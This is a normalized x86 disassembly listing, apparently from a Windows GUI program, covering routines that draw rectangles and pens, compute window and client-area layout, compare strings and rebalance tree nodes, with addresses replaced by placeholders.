mov edx [ esp + 0x4c ]
mov ecx [ esp + 0x48 ]
mov eax [ esp + 0x50 ]
add esp 0x8
mov [ esp + 0x30 ] ecx
mov ecx [ esp + 0x4c ]
mov [ esp + 0x34 ] edx
mov edx [ esp + 0x10 ]
mov [ esp + 0x38 ] eax
mov eax [ esp + 0x14 ]
push edx
mov [ esp + 0x40 ] ecx
push eax
lea ecx [ esp + 0x38 ]
push ecx
call [ OffsetRect@IAT ]
mov edx [ esp + 0x70 ]
mov eax [ edx ]
mov edx [ esp + 0x64 ]
push eax
lea ecx [ esp + 0x34 ]
push ecx
push edx
call [ FillRect@IAT ]
mov ecx [ esp + 0x18 ]
pop edi
pop esi
pop ebp
pop ebx
add esp 0x50
retn
mov edi [ esp + 0x68 ]
mov edx [ rw-data ]
mov ecx [ rw-data ]
mov eax [ edi + 0x4 ]
lea ecx [ edx + ecx + 0x1 ]
cdq
idiv ecx
mov [ esp + 0x70 ] ecx
mov esi eax
mov eax [ esp + 0x54 ]
imul esi ecx
cdq
idiv ecx
mov eax [ edi + 0xc ]
sub esi edx
cmp esi eax
jge r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ esp + 0x7c ]
neg eax
mov [ esp + 0x10 ] eax
mov eax [ esp + 0x78 ]
neg eax
mov [ esp + 0x14 ] eax
jmp r-xdata
mov edx [ ebp + 0xc ]
add edi ecx
cmp edi edx
mov [ esp + 0x70 ] edi
jl r-xdata
mov eax [ esp + 0x7c ]
neg eax
mov [ esp + 0x10 ] eax
mov eax [ esp + 0x78 ]
lea edx [ edi + ecx ]
neg eax
mov [ esp + 0x2c ] edx
mov [ esp + 0x14 ] eax
lea eax [ esi + ecx ]
mov [ esp + 0x2c ] eax
mov [ esp + 0x4c ] eax
lea eax [ esp + 0x40 ]
push edi
push eax
mov [ esp + 0x48 ] 0x0
mov [ esp + 0x4c ] esi
mov [ esp + 0x50 ] ebp
call sub_45ce70
mov ecx [ esp + 0x48 ]
mov eax [ esp + 0x18 ]
mov edx [ esp + 0x4c ]
mov ebx [ esp + 0x50 ]
mov edi [ esp + 0x54 ]
add esp 0x8
mov [ esp + 0x30 ] ecx
mov ecx [ esp + 0x14 ]
push eax
mov [ esp + 0x38 ] edx
push ecx
lea edx [ esp + 0x38 ]
push edx
mov [ esp + 0x44 ] ebx
mov [ esp + 0x48 ] edi
call [ OffsetRect@IAT ]
push 0x0
push 0x0
push 0x0
call sub_40af00
mov ecx [ esp + 0x50 ]
push eax
mov eax [ esp + 0x80 ]
push 0x0
push 0x0
push eax
mov eax [ esp + 0x5c ]
push ebp
mov edx ecx
sub edx esi
push edx
mov edx [ esp + 0x74 ]
add edx eax
push edx
mov edx [ esp + 0x8c ]
sub edi ecx
mov ecx [ esp + 0x58 ]
push edi
sub ebx eax
mov eax [ esp + 0x60 ]
push ebx
push eax
push ecx
mov ecx [ esp + 0x5c ]
push edx
call sub_4421e0
mov eax [ esp + 0x68 ]
mov esi [ esp + 0x2c ]
cmp esi [ eax + 0xc ]
jl r-xdata
cmp esi eax
jge r-xdata
pop edi
pop esi
pop ebp
pop ebx
add esp 0x50
retn
lea eax [ esi + ebx ]
mov [ esp + 0x28 ] eax
mov [ esp + 0x48 ] eax
mov eax [ esp + 0x2c ]
lea ecx [ esp + 0x40 ]
push ebp
push ecx
mov [ esp + 0x48 ] esi
mov [ esp + 0x4c ] edi
mov [ esp + 0x54 ] eax
call sub_45ce70
mov edx [ esp + 0x48 ]
mov ecx [ esp + 0x18 ]
mov eax [ esp + 0x4c ]
mov edi [ esp + 0x50 ]
mov ebp [ esp + 0x54 ]
add esp 0x8
mov [ esp + 0x30 ] edx
mov edx [ esp + 0x14 ]
push ecx
mov [ esp + 0x38 ] eax
push edx
lea eax [ esp + 0x38 ]
push eax
mov [ esp + 0x44 ] edi
mov [ esp + 0x48 ] ebp
call [ OffsetRect@IAT ]
push 0x0
push 0x0
push 0x0
call sub_40af00
mov ecx [ esp + 0x24 ]
push eax
mov eax [ esp + 0x80 ]
push 0x0
push 0x0
push ecx
mov ecx [ esp + 0x60 ]
push ebx
mov edx ecx
sub edx eax
mov eax [ esp + 0x60 ]
push edx
mov edx eax
sub edx esi
push edx
mov edx [ esp + 0x8c ]
sub ebp ecx
mov ecx [ esp + 0x58 ]
push ebp
sub edi eax
mov eax [ esp + 0x60 ]
push edi
push eax
push ecx
mov ecx [ esp + 0x5c ]
push edx
call sub_4421e0
mov eax [ esp + 0x68 ]
mov esi [ esp + 0x28 ]
mov eax [ eax + 0x8 ]
cmp esi eax
mov ebp [ esp + 0x68 ]
mov edi [ esp + 0x70 ]
jl r-xdata
mov esi [ esp + 0x20 ]
mov ecx [ esp + 0x18 ]
mov ecx [ esp + 0x70 ]
mov edi [ esp + 0x68 ]
lea ecx [ ecx ]
pop edi
pop esi
pop ebp
pop ebx
add esp 0x50
retn
sub_45d640
sub esp 0x10
push ebx
mov ebx [ InvertRect@IAT ]
push esi
mov esi [ esp + 0x20 ]
mov ecx esi
mov eax [ ecx ]
mov edx [ ecx + 0x4 ]
mov [ esp + 0xc ] edx
mov edx [ ecx + 0x8 ]
mov ecx [ ecx + 0xc ]
push edi
mov edi [ esp + 0x20 ]
mov [ esp + 0x14 ] edx
lea edx [ esp + 0xc ]
mov [ esp + 0xc ] eax
push edx
inc eax
push edi
mov [ esp + 0x20 ] ecx
mov [ esp + 0x1c ] eax
call ebx
mov ecx esi
mov edx [ ecx ]
mov eax [ ecx + 0x4 ]
mov [ esp + 0xc ] edx
mov [ esp + 0x10 ] eax
mov eax [ ecx + 0x8 ]
mov ecx [ ecx + 0xc ]
lea edx [ esp + 0xc ]
mov [ esp + 0x14 ] eax
push edx
dec eax
push edi
mov [ esp + 0x20 ] ecx
mov [ esp + 0x14 ] eax
call ebx
mov ecx esi
mov edx [ ecx ]
mov eax [ ecx + 0x4 ]
mov [ esp + 0xc ] edx
mov edx [ ecx + 0x8 ]
mov ecx [ ecx + 0xc ]
mov [ esp + 0x14 ] edx
lea edx [ esp + 0xc ]
mov [ esp + 0x10 ] eax
push edx
inc eax
mov [ esp + 0x1c ] ecx
push edi
mov [ esp + 0x20 ] eax
call ebx
mov eax [ esi ]
mov ecx [ esi + 0x4 ]
mov edx [ esi + 0x8 ]
mov esi [ esi + 0xc ]
mov [ esp + 0xc ] eax
lea eax [ esp + 0xc ]
mov [ esp + 0x18 ] esi
push eax
dec esi
mov [ esp + 0x14 ] ecx
push edi
mov [ esp + 0x1c ] edx
mov [ esp + 0x18 ] esi
call ebx
pop edi
pop esi
pop ebx
add esp 0x10
retn
sub_45d710
mov eax [ esp + 0xc ]
push ebx
push ebp
neg eax
push esi
sbb eax eax
push edi
and eax 0x73af
add eax 0xff8c50
push eax
push 0x2
push 0x6
call [ CreatePen@IAT ]
mov esi [ esp + 0x14 ]
mov edi [ SelectObject@IAT ]
mov ebx eax
push ebx
push esi
call edi
push 0x5
mov ebp eax
call [ GetStockObject@IAT ]
push eax
push esi
call edi
mov [ esp + 0x1c ] eax
mov eax [ esp + 0x18 ]
mov ecx [ eax + 0xc ]
mov edx [ eax + 0x8 ]
push ecx
mov ecx [ eax + 0x4 ]
push edx
mov edx [ eax ]
push ecx
push edx
push esi
call [ Rectangle@IAT ]
push ebp
push esi
call edi
mov eax [ esp + 0x1c ]
push eax
push esi
call edi
push ebx
call [ DeleteObject@IAT ]
pop edi
pop esi
pop ebp
pop ebx
retn
sub_45d790
mov ecx [ esp + 0x10 ]
sub esp 0x10
push esi
lea eax [ esp + 0x4 ]
push eax
push ecx
call [ GetWindowRect@IAT ]
mov edx [ esp + 0x4 ]
mov eax [ esp + 0xc ]
add eax edx
cdq
sub eax edx
mov edx [ esp + 0x8 ]
mov ecx eax
mov eax [ esp + 0x10 ]
add eax edx
cdq
sub eax edx
mov edx [ rw-data ]
sar ecx 0x1
sar eax 0x1
test edx edx
mov edx [ esp + 0x20 ]
jne r-xdata
cmp [ edx ] ecx
jg r-xdata
mov esi [ rw-data ]
test esi esi
jne r-xdata
mov eax 0x1
pop esi
add esp 0x10
retn 0x10
cmp ecx [ edx + 0x8 ]
jge r-xdata
push edi
mov esi edx
mov edi [ esi ]
mov [ rw-data ] edi
mov edi [ esi + 0x4 ]
mov [ rw-data ] edi
mov edi [ esi + 0x8 ]
mov [ rw-data ] edi
mov esi [ esi + 0xc ]
mov [ rw-data ] esi
pop edi
cmp [ edx + 0x4 ] eax
jg r-xdata
cmp eax [ edx + 0xc ]
jge r-xdata
mov ecx [ edx ]
mov [ rw-data ] ecx
mov eax [ edx + 0x4 ]
mov [ rw-data ] eax
mov ecx [ edx + 0x8 ]
mov [ rw-data ] ecx
mov edx [ edx + 0xc ]
mov [ rw-data ] edx
xor eax eax
pop esi
add esp 0x10
retn 0x10
sub_45d850
push esi
mov esi ecx
mov eax [ esi + 0x14 ]
push edi
mov edi [ esp + 0xc ]
cmp eax edi
ja r-xdata
cmp [ esi + 0x18 ] 0x10
jb r-xdata
call sub_4b5762
lea eax [ esi + edi + 0x4 ]
pop edi
pop esi
retn 0x4
mov esi [ esi + 0x4 ]
lea eax [ esi + edi ]
pop edi
pop esi
retn 0x4
sub_45d880
mov eax [ ecx + 0x4 ]
test eax eax
jne r-xdata
mov ecx [ ecx + 0x8 ]
sub ecx eax
mov eax 0x2aaaaaab
imul ecx
sar edx 0x1
mov eax edx
shr eax 0x1f
add edx eax
mov eax edx
retn
retn
sub_45d8a0
mov eax [ ecx + 0x4 ]
test eax eax
jne r-xdata
mov ecx [ ecx + 0x8 ]
sub ecx eax
mov eax 0x94f2095
imul ecx
sar edx 0x3
mov eax edx
shr eax 0x1f
add edx eax
mov eax edx
retn
retn
sub_45d8d0
mov eax [ ecx + 0x4 ]
test eax eax
jne r-xdata
mov ecx [ ecx + 0x8 ]
sub ecx eax
mov eax 0x4ec4ec4f
imul ecx
sar edx 0x7
mov eax edx
shr eax 0x1f
add edx eax
mov eax edx
retn
retn
sub_45d950
mov edx [ esp + 0x4 ]
mov eax [ edx + 0x8 ]
push ebx
push esi
mov esi [ eax ]
mov [ edx + 0x8 ] esi
mov esi [ eax ]
mov bl [ esi + 0x89 ]
test bl bl
jne r-xdata
mov esi [ edx + 0x4 ]
mov [ eax + 0x4 ] esi
mov ecx [ ecx + 0x4 ]
cmp edx [ ecx + 0x4 ]
jne r-xdata
mov [ esi + 0x4 ] edx
mov ecx [ edx + 0x4 ]
cmp edx [ ecx ]
jne r-xdata
mov [ ecx + 0x4 ] eax
pop esi
mov [ eax ] edx
mov [ edx + 0x4 ] eax
pop ebx
retn 0x4
mov [ ecx + 0x8 ] eax
pop esi
mov [ eax ] edx
mov [ edx + 0x4 ] eax
pop ebx
retn 0x4
mov [ ecx ] eax
pop esi
mov [ eax ] edx
mov [ edx + 0x4 ] eax
pop ebx
retn 0x4
sub_45d9b0
mov edx [ esp + 0x4 ]
mov eax [ edx ]
push ebx
push esi
mov esi [ eax + 0x8 ]
mov [ edx ] esi
mov esi [ eax + 0x8 ]
mov bl [ esi + 0x89 ]
test bl bl
jne r-xdata
mov esi [ edx + 0x4 ]
mov [ eax + 0x4 ] esi
mov ecx [ ecx + 0x4 ]
cmp edx [ ecx + 0x4 ]
jne r-xdata
mov [ esi + 0x4 ] edx
mov ecx [ edx + 0x4 ]
cmp edx [ ecx + 0x8 ]
jne r-xdata
mov [ ecx + 0x4 ] eax
pop esi
mov [ eax + 0x8 ] edx
mov [ edx + 0x4 ] eax
pop ebx
retn 0x4
mov [ ecx ] eax
pop esi
mov [ eax + 0x8 ] edx
mov [ edx + 0x4 ] eax
pop ebx
retn 0x4
mov [ ecx + 0x8 ] eax
pop esi
mov [ eax + 0x8 ] edx
mov [ edx + 0x4 ] eax
pop ebx
retn 0x4
sub_45da10
mov edx [ esp + 0x4 ]
mov eax [ edx + 0x8 ]
push ebx
push esi
mov esi [ eax ]
mov [ edx + 0x8 ] esi
mov esi [ eax ]
mov bl [ esi + 0x15 ]
test bl bl
jne r-xdata
mov esi [ edx + 0x4 ]
mov [ eax + 0x4 ] esi
mov ecx [ ecx + 0x4 ]
cmp edx [ ecx + 0x4 ]
jne r-xdata
mov [ esi + 0x4 ] edx
mov ecx [ edx + 0x4 ]
cmp edx [ ecx ]
jne r-xdata
mov [ ecx + 0x4 ] eax
pop esi
mov [ eax ] edx
mov [ edx + 0x4 ] eax
pop ebx
retn 0x4
mov [ ecx + 0x8 ] eax
pop esi
mov [ eax ] edx
mov [ edx + 0x4 ] eax
pop ebx
retn 0x4
mov [ ecx ] eax
pop esi
mov [ eax ] edx
mov [ edx + 0x4 ] eax
pop ebx
retn 0x4
sub_45da90
mov edx [ esp + 0x4 ]
mov eax [ edx ]
push ebx
push esi
mov esi [ eax + 0x8 ]
mov [ edx ] esi
mov esi [ eax + 0x8 ]
mov bl [ esi + 0x15 ]
test bl bl
jne r-xdata
mov esi [ edx + 0x4 ]
mov [ eax + 0x4 ] esi
mov ecx [ ecx + 0x4 ]
cmp edx [ ecx + 0x4 ]
jne r-xdata
mov [ esi + 0x4 ] edx
mov ecx [ edx + 0x4 ]
cmp edx [ ecx + 0x8 ]
jne r-xdata
mov [ ecx + 0x4 ] eax
pop esi
mov [ eax + 0x8 ] edx
mov [ edx + 0x4 ] eax
pop ebx
retn 0x4
mov [ ecx ] eax
pop esi
mov [ eax + 0x8 ] edx
mov [ edx + 0x4 ] eax
pop ebx
retn 0x4
mov [ ecx + 0x8 ] eax
pop esi
mov [ eax + 0x8 ] edx
mov [ edx + 0x4 ] eax
pop ebx
retn 0x4
sub_45db10
mov eax [ ecx ]
mov dl [ eax + 0x15 ]
test dl dl
jne r-xdata
retn
mov edx [ eax + 0x8 ]
push ebx
mov bl [ edx + 0x15 ]
test bl bl
jne r-xdata
mov eax [ eax + 0x4 ]
mov dl [ eax + 0x15 ]
test dl dl
jne r-xdata
mov eax [ edx ]
mov bl [ eax + 0x15 ]
test bl bl
jne r-xdata
mov [ ecx ] eax
pop ebx
lea esp [ esp ]
mov [ ecx ] edx
pop ebx
retn
lea ecx [ ecx ]
mov [ ecx ] eax
mov eax [ eax + 0x4 ]
mov dl [ eax + 0x15 ]
test dl dl
je r-xdata
mov edx eax
mov eax [ edx ]
mov bl [ eax + 0x15 ]
test bl bl
je r-xdata
mov edx [ ecx ]
cmp edx [ eax + 0x8 ]
jne r-xdata
sub_45db70
mov eax [ esp + 0x8 ]
mov ecx [ eax + 0x18 ]
push ebx
push esi
add eax 0x4
cmp ecx 0x10
push edi
jb r-xdata
mov ebx eax
mov ebx [ eax ]
jmp r-xdata
mov edx eax
mov edx [ eax ]
jmp r-xdata
cmp ecx 0x10
jb r-xdata
mov edi eax
mov edi [ eax ]
jmp r-xdata
mov eax [ esp + 0x10 ]
mov ecx [ eax + 0x18 ]
add eax 0x4
cmp ecx 0x10
jb r-xdata
mov esi eax
mov esi [ eax ]
jmp r-xdata
cmp ecx 0x10
jb r-xdata
push 0xffffffff
push edx
call sub_457f90
add esp 0x4
add eax ebx
push eax
push 0xffffffff
push esi
call sub_457f90
add esp 0x4
add eax edi
push eax
push 0x1
push 0x800
call [ CompareStringA@IAT ]
dec eax
neg eax
pop edi
sbb al al
pop esi
inc al
pop ebx
retn 0x8
sub_45dbf0
push ecx
push ebx
push ebp
mov ebp [ esp + 0x14 ]
mov eax [ ebp + 0x18 ]
push esi
add ebp 0x4
cmp eax 0x10
push edi
jb r-xdata
mov [ esp + 0x10 ] ebp
mov ecx [ ebp ]
mov [ esp + 0x10 ] ecx
jmp r-xdata
mov eax ebp
mov eax [ ebp ]
jmp r-xdata
cmp eax 0x10
jb r-xdata
mov edi ebx
mov edi [ ebx ]
jmp r-xdata
mov ebx [ esp + 0x18 ]
mov ecx [ ebx + 0x18 ]
add ebx 0x4
cmp ecx 0x10
jb r-xdata
mov esi ebx
mov esi [ ebx ]
jmp r-xdata
cmp ecx 0x10
jb r-xdata
cmp eax 0x3
jne r-xdata
pop edi
pop esi
pop ebp
mov al al
pop ebx
pop ecx
retn 0x8
push 0xffffffff
push eax
call sub_458010
mov ecx [ esp + 0x18 ]
add esp 0x4
add eax ecx
push eax
push 0xffffffff
push esi
call sub_458010
add esp 0x4
add eax edi
push eax
push 0x1
push 0x800
call [ CompareStringA@IAT ]
cmp eax 0x1
jne r-xdata
mov edx [ esp + 0x1c ]
mov eax [ edx + 0x18 ]
cmp eax 0x10
jb r-xdata
pop edi
pop esi
pop ebp
xor al al
pop ebx
pop ecx
retn 0x8
mov [ esp + 0x1c ] ebp
mov ecx [ ebp ]
mov [ esp + 0x1c ] ecx
jmp r-xdata
mov edx [ esp + 0x18 ]
mov eax [ edx + 0x18 ]
cmp eax 0x10
jb r-xdata
mov ebp [ ebp ]
cmp eax 0x10
jb r-xdata
mov edi ebx
mov edi [ ebx ]
jmp r-xdata
mov esi ebx
mov esi [ ebx ]
jmp r-xdata
cmp eax 0x10
jb r-xdata
push 0xffffffff
push ebp
call sub_457f40
mov edx [ esp + 0x24 ]
add esp 0x4
add eax edx
push eax
push 0xffffffff
push esi
call sub_457f40
add esp 0x4
add eax edi
push eax
push 0x1
push 0x800
call [ CompareStringA@IAT ]
dec eax
pop edi
neg eax
pop esi
sbb al al
pop ebp
inc al
pop ebx
pop ecx
retn 0x8
sub_45dd10
push ebp
push esi
mov esi [ esp + 0xc ]
mov ebp [ esi + 0x14 ]
test ebp ebp
jne r-xdata
push ebx
lea ebx [ ebp - 0x1 ]
cmp ebp ebx
push edi
ja r-xdata
pop esi
xor al al
pop ebp
retn
cmp [ esi + 0x18 ] 0x10
lea edi [ esi + 0x4 ]
jb r-xdata
mov ecx esi
call sub_4b5762
mov eax edi
mov eax [ edi ]
jmp r-xdata
cmp ebp 0x1
je r-xdata
cmp al 0x5c
je r-xdata
mov al [ eax + ebx ]
cmp al 0x2f
je r-xdata
pop edi
pop ebx
pop esi
mov al 0x1
pop ebp
retn
mov eax [ esi + 0x14 ]
lea ebx [ ebp - 0x2 ]
cmp eax ebx
ja r-xdata
pop edi
pop ebx
pop esi
xor al al
pop ebp
retn
cmp [ esi + 0x18 ] 0x10
jb r-xdata
mov ecx esi
call sub_4b5762
mov al [ edi + ebx ]
xor al 0x20
add al 0x5f
cmp al 0x3b
ja r-xdata
mov edi [ edi ]
cmp ebp 0x2
je r-xdata
add ebp 0xfffffffd
push ebp
mov ecx esi
call sub_45d850
mov cl [ eax ]
xor cl 0x20
pop edi
add cl 0x5f
mov dl 0x3b
cmp dl cl
pop ebx
sbb al al
pop esi
inc al
pop ebp
retn
sub_45ddb0
push 0xffffffff
push sub_4c0990
mov eax [ fs : 0x0 ]
push eax
mov [ fs : 0x0 ] esp
sub esp 0x18
push ebx
push ebp
push esi
push edi
mov esi [ esp + 0x38 ]
mov ebp [ esp + 0x3c ]
mov edi [ esp + 0x40 ]
mov ebx [ esp + 0x44 ]
mov [ esi ] 0x0
mov [ ebp ] 0x0
mov [ edi ] 0x0
mov [ ebx ] 0x0
mov edx [ rw-data ]
test edx edx
mov eax 0x1
mov [ esp + 0x30 ] eax
je r-xdata
cmp [ rw-data ] eax
jne r-xdata
push edx
call sub_45b5d0
add esp 0x4
cmp edx 0x1b
mov [ esp + 0x14 ] eax
jne r-xdata
mov eax [ esp + 0x4c ]
test eax eax
je r-xdata
mov ebx [ esp + 0x4c ]
test ebx ebx
je r-xdata
mov ecx [ rw-data ]
test ecx ecx
jne r-xdata
mov ecx [ rw-data ]
test ecx ecx
jne r-xdata
mov ebx [ esp + 0x4c ]
mov edi [ esp + 0x50 ]
call sub_40af00
push eax
xor eax eax
test edi edi
mov al [ rw-data ]
push eax
je r-xdata
fild [ esi ]
push ecx
fmul [ esp + 0x58 ]
fstp [ esp ]
call sub_452500
mov ecx [ esp + 0x44 ]
mov [ ecx ] eax
fild [ ebp ]
fmul [ esp + 0x58 ]
fstp [ esp ]
call sub_452500
mov edx [ esp + 0x48 ]
add esp 0x4
mov [ edx ] eax
jmp r-xdata
call sub_40af00
xor ecx ecx
mov cl [ rw-data ]
push eax
push ecx
mov ecx ebx
call sub_4440b0
mov [ esi ] eax
call sub_40af00
xor edx edx
mov dl [ rw-data ]
push eax
mov ecx ebx
push edx
call sub_444100
mov [ ebp ] eax
mov al [ esp + 0x48 ]
test al al
je r-xdata
mov ecx [ rw-data ]
mov [ esi ] ecx
mov edx [ rw-data ]
mov ecx eax
imul ecx ecx 0x12c
mov [ ebp ] edx
mov edx [ ecx + rw-data ]
test edx edx
jne r-xdata
mov ecx [ rw-data ]
mov ecx [ rw-data ]
jmp r-xdata
mov esi [ esp + 0x50 ]
test esi esi
mov [ esp + 0x30 ] 0xffffffff
je r-xdata
dec [ ebx + 0xd48 ]
jne r-xdata
mov edi [ esp + 0x54 ]
mov ecx edi
call sub_4440b0
mov ebx eax
mov [ esp + 0x38 ] ebx
mov [ esp + 0x10 ] ebx
call sub_40af00
xor ecx ecx
mov cl [ rw-data ]
push eax
push ecx
mov ecx edi
call sub_444100
mov edi eax
lea edx [ ebx + ebx ]
mov [ esp + 0x3c ] eax
mov [ esp + 0x14 ] edi
mov [ esi ] edx
mov ecx [ esp + 0x54 ]
call sub_4440b0
mov [ esp + 0x38 ] eax
call sub_40af00
xor ecx ecx
mov cl [ rw-data ]
push eax
push ecx
mov ecx edi
call sub_4440b0
mov ebx eax
mov [ esp + 0x10 ] ebx
call sub_40af00
mov ecx [ esp + 0x4c ]
xor edx edx
mov dl [ rw-data ]
push eax
push edx
call sub_444100
mov [ esp + 0x3c ] eax
call sub_40af00
push eax
xor eax eax
mov al [ rw-data ]
mov ecx edi
push eax
call sub_444100
mov ecx [ esp + 0x38 ]
mov edi eax
mov eax [ esp + 0x3c ]
cmp eax edi
lea edx [ ebx + ecx ]
mov [ esp + 0x14 ] edi
mov [ esi ] edx
jg r-xdata
test ebx ebx
mov [ esp + 0x30 ] 0x0
je r-xdata
mov eax [ ebx ]
push eax
call sub_4a8dd0
add esp 0x4
test al al
je r-xdata
fild [ esi ]
push ecx
fmul [ esp + 0x58 ]
fstp [ esp ]
call sub_452500
mov [ edi ] eax
fild [ ebp ]
fmul [ esp + 0x58 ]
fstp [ esp ]
call sub_452500
mov [ ebx ] eax
jmp r-xdata
cmp eax 0x2
jl r-xdata
test ecx ecx
je r-xdata
mov ecx [ esp + 0x28 ]
pop edi
pop esi
pop ebp
pop ebx
mov [ fs : 0x0 ] ecx
add esp 0x24
retn
dec [ esi + 0xd48 ]
jne r-xdata
mov ecx ebx
call sub_43fe30
push ebx
call j_sub_4b66ed#2
add esp 0x4
fild [ esp + 0x3c ]
push ecx
fmul [ esp + 0x58 ]
fstp [ esp ]
call sub_452500
mov edx [ esp + 0x48 ]
add esp 0x4
test edi edi
mov [ esp + 0x3c ] eax
mov [ edx ] eax
push ecx
je r-xdata
cmp eax 0x5
jne r-xdata
mov [ ebp ] eax
mov [ ebp ] edi
jmp r-xdata
mov eax [ ebx ]
push eax
call sub_4a8f50
mov edi eax
mov eax [ ebx ]
push eax
call sub_4a90d0
mov ecx [ rw-data ]
mov edx 0x1
add esp 0x8
cmp ecx edx
jne r-xdata
add esp 0x4
mov eax [ rw-data ]
test eax eax
jle r-xdata
mov ecx esi
call sub_43fe30
push esi
call j_sub_4b66ed#2
add esp 0x4
fild [ esp + 0x3c ]
fmul [ esp + 0x58 ]
fstp [ esp ]
call sub_452500
mov ecx [ esp + 0x44 ]
fild [ esp + 0x40 ]
fimul [ esp + 0x14 ]
fidiv [ esp + 0x18 ]
fstp [ esp ]
call sub_452500
fild [ esp + 0x3c ]
mov esi eax
fmul [ esp + 0x58 ]
fstp [ esp ]
call sub_452500
add esp 0x4
add esi eax
mov eax [ esp + 0x40 ]
mov [ eax ] esi
jmp r-xdata
fild [ esp + 0x10 ]
push ecx
fmul [ esp + 0x58 ]
fstp [ esp ]
call sub_452500
fild [ esp + 0x3c ]
mov esi eax
fmul [ esp + 0x58 ]
fstp [ esp ]
call sub_452500
mov edx [ esp + 0x44 ]
add esi eax
mov [ edx ] esi
fild [ ebp ]
fmul [ esp + 0x58 ]
fstp [ esp ]
call sub_452500
mov ecx [ esp + 0x48 ]
jmp r-xdata
mov eax [ rw-data ]
test eax eax
jne r-xdata
mov eax [ rw-data ]
cmp eax 0x6
je r-xdata
cmp ecx 0x2
jne r-xdata
mov ecx [ rw-data ]
test ecx ecx
jne r-xdata
mov edx [ rw-data ]
push 0xfffffff0
push edx
call [ GetWindowLongA@IAT ]
mov ecx [ rw-data ]
mov esi eax
lea eax [ esp + 0x18 ]
push eax
push ecx
call [ GetClientRect@IAT ]
mov edi [ GetSystemMetrics@IAT ]
push 0x2
call edi
mov ebp eax
push 0x3
mov [ esp + 0x14 ] ebp
call edi
mov edi [ esp + 0x20 ]
sub edi [ esp + 0x18 ]
test esi 0x200000
je r-xdata
mov [ ecx ] eax
mov eax [ rw-data ]
test eax eax
je r-xdata
mov ecx [ rw-data ]
test ecx ecx
jne r-xdata
cmp ecx edx
jne r-xdata
cmp [ rw-data ] edx
je r-xdata
mov ecx [ esp + 0x24 ]
sub ecx [ esp + 0x1c ]
test esi 0x100000
mov [ esp + 0x3c ] ecx
je r-xdata
add edi ebp
fild [ esp + 0x38 ]
push ecx
fmul [ esp + 0x58 ]
fstp [ esp ]
call sub_452500
fild [ esp + 0x40 ]
mov edi [ esp + 0x44 ]
shl eax 0x1
mov [ edi ] eax
fmul [ esp + 0x58 ]
fstp [ esp ]
call sub_452500
add esp 0x4
test ebx ebx
mov esi eax
je r-xdata
cmp ecx edx
jne r-xdata
cmp [ rw-data ] edx
je r-xdata
mov ecx [ esi ]
add eax edi
cmp eax ecx
jge r-xdata
mov ecx [ rw-data ]
test ecx ecx
jne r-xdata
mov ecx [ esi ]
mov edx ecx
sub edx edi
add eax edx
cmp eax ecx
jge r-xdata
mov eax [ rw-data ]
cmp eax 0x1d
je r-xdata
add ecx eax
mov [ esp + 0x3c ] ecx
xor eax eax
fild [ edi ]
push ecx
fimul [ esp + 0x18 ]
fmul [ r--data ]
fidiv [ esp + 0x14 ]
fstp [ esp ]
call sub_452500
add esp 0x4
jmp r-xdata
mov ecx [ ebp ]
add eax edi
cmp eax ecx
jge r-xdata
mov ecx [ rw-data ]
test ecx ecx
jne r-xdata
mov ecx [ ebp ]
mov edx ecx
sub edx edi
add eax edx
cmp eax ecx
jge r-xdata
mov [ esi ] eax
jmp r-xdata
mov [ esi ] eax
jmp r-xdata
mov ecx rw-data
cmp eax 0x1c
je r-xdata
mov ecx [ esp + 0x44 ]
mov [ ecx ] eax
jmp r-xdata
mov eax [ esp + 0x44 ]
mov [ eax ] esi
jmp r-xdata
cmp esi eax
mov ebx [ esp + 0x4c ]
jle r-xdata
mov [ ebp ] edi
mov [ ebp ] eax
jmp r-xdata
lea ecx [ eax + ebp ]
add eax edi
cdq
idiv ecx
mov ecx eax
test ecx ecx
jg r-xdata
add esi 0x4
cmp eax 0xc
jl r-xdata
mov eax ebx
cdq
idiv ecx
test edx edx
je r-xdata
mov ecx 0x1
mov ebx [ rw-data ]
jmp r-xdata
add eax 0xfffffff4
cdq
and edx 0x3
add eax edx
sar eax 0x2
lea edx [ eax + eax * 2 ]
cmp [ esp + 0x14 ] 0x4
mov ebx [ edx * 4 + rw-data ]
mov [ esp + 0x38 ] ebx
jne r-xdata
mov edx [ rw-data ]
add esi edx
lea edx [ eax - 0x1 ]
imul edx [ rw-data ]
mov ebx esi
imul ebx eax
add edx ebx
cmp edx [ esp + 0x3c ]
mov ebx [ rw-data ]
jle r-xdata
inc eax
mov [ esp + 0x38 ] ebx
mov esi [ rw-data ]
mov eax [ rw-data ]
mov ebp [ rw-data ]
lea esi [ esi + esi * 2 ]
shl esi 0x2
test esi esi
jle r-xdata
mov ecx rw-data
jmp r-xdata
mov edi [ esp + 0x38 ]
sub edi [ esp + 0x10 ]
lea eax [ ebx + edi ]
cdq
lea ecx [ ebx + ebp ]
idiv ecx
mov ecx eax
test ecx ecx
jg r-xdata
call sub_4010c0
mov ebx eax
lea edx [ ecx - 0x1 ]
imul ebp ecx
imul esi eax
imul edx ebx
mov [ rw-data ] ecx
mov ecx [ esp + 0x40 ]
add edx ebp
mov [ rw-data ] eax
mov [ ecx ] edx
lea edx [ eax - 0x1 ]
imul edx [ rw-data ]
mov eax [ esp + 0x44 ]
add edx esi
mov [ eax ] edx
jmp r-xdata
mov ecx edi
mov edi [ esp + 0x38 ]
mov eax edi
cdq
idiv ecx
test edx edx
je r-xdata
mov ecx 0x1
cmp ecx edi
jle r-xdata
inc eax
jmp r-xdata
sub_45e3f0
sub esp 0x2c
mov eax [ rw-data ]
push ebx
push ebp
push esi
push edi
push 0xfffffff0
push eax
call [ GetWindowLongA@IAT ]
mov edx [ rw-data ]
lea ecx [ esp + 0x2c ]
push ecx
push edx
mov edi eax
call [ GetClientRect@IAT ]
mov eax [ rw-data ]
xor ebx ebx
cmp eax ebx
mov [ esp + 0x14 ] ebx
mov [ esp + 0x18 ] ebx
jne r-xdata
mov esi [ GetSystemMetrics@IAT ]
push 0x2
call esi
push 0x3
mov [ esp + 0x18 ] eax
call esi
mov [ esp + 0x18 ] eax
cmp [ rw-data ] ebx
je r-xdata
mov eax [ esp + 0x38 ]
sub eax [ esp + 0x30 ]
test edi 0x100000
mov [ esp + 0x10 ] eax
je r-xdata
add esi [ esp + 0x14 ]
mov esi [ esp + 0x34 ]
sub esi [ esp + 0x2c ]
test edi 0x200000
je r-xdata
mov eax [ rw-data ]
push eax
mov eax [ rw-data ]
cmp eax ebx
push ecx
mov [ esp + 0x28 ] esp
mov ecx esp
je r-xdata
add eax [ esp + 0x18 ]
mov [ esp + 0x10 ] eax
mov [ ecx ] eax
mov eax [ rw-data ]
cmp eax ebx
